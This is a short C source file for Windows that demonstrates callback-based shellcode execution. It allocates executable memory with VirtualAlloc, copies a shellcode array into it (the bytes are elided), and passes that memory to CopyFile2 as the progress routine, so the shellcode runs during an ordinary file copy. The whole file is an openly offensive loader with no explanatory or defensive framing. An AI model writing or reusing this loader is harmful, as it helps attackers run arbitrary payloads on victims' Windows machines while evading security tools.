#include <windows.h>
#include <stdio.h>

typedef struct COPYFILE2_EXTENDED_PARAMETERS {
  DWORD                       dwSize;
  DWORD                       dwCopyFlags;
  BOOL                        *pfCancel;
  LPVOID                      pProgressRoutine;
  PVOID                       pvCallbackContext;
} COPYFILE2_EXTENDED_PARAMETERS;

extern HRESULT CopyFile2(PCWSTR pwszExistingFileName, PCWSTR pwszNewFileName, COPYFILE2_EXTENDED_PARAMETERS *pExtendedParameters);

unsigned char shellcode[] = ...


int main() {
    LPVOID addr = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    RtlMoveMemory(addr, shellcode, sizeof(shellcode));

    COPYFILE2_EXTENDED_PARAMETERS params;

    params.dwSize = sizeof(params);
    params.dwCopyFlags = COPY_FILE_FAIL_IF_EXISTS;
    params.pfCancel = FALSE;
    // params.pProgressRoutine = (PCOPYFILE2_PROGRESS_ROUTINE)addr;
    params.pProgressRoutine = addr;
    params.pvCallbackContext = NULL;

    DeleteFileW(L"C:\\Windows\\Temp\\backup.log");
    CopyFile2(L"C:\\Windows\\DirectX.log", L"C:\\Windows\\Temp\\backup.log", &params);
}